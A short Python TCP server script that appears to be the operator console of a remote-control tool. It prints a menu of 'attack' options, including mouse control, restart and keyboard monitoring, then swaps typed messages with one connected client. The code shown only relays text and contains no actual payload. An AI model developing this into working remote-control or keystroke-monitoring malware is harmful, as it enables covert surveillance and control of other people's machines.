import socket

def start_server():
    # Create a socket object
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Define server host and port
    host = '192.168.0.179'
    port = 12310
    
    # Bind the socket to the host and port
    server_socket.bind((host, port))
    
    # Server listens for connections (max 5 connections in the queue)
    server_socket.listen(5)
    print("Choose an option for attack: 1- Mouse Attack\n, 2- Restart\n, 3- keyboard monitering\n")
    
    # Accept the client connection
    client_socket, addr = server_socket.accept()
    print(f"Connected to {addr}")
    smsg = "You are connected with server !!!"
    client_socket.send(smsg.encode('utf-8'))

    
    while True:
        # Receive message from the client
        client_message = client_socket.recv(1024).decode('utf-8')
        if client_message.lower() == 'exit':
            print("Client disconnected")
            break
        
        print(f"Client: {client_message}")
        
        # Send a response back to the client
        server_message = input("Server: ")
        client_socket.send(server_message.encode('utf-8'))
        
        if server_message.lower() == 'exit':
            print("Closing connection")
            break

    # Close the client socket
    client_socket.close()
    # Close the server socket
    server_socket.close()

if __name__ == "__main__":
    start_server()
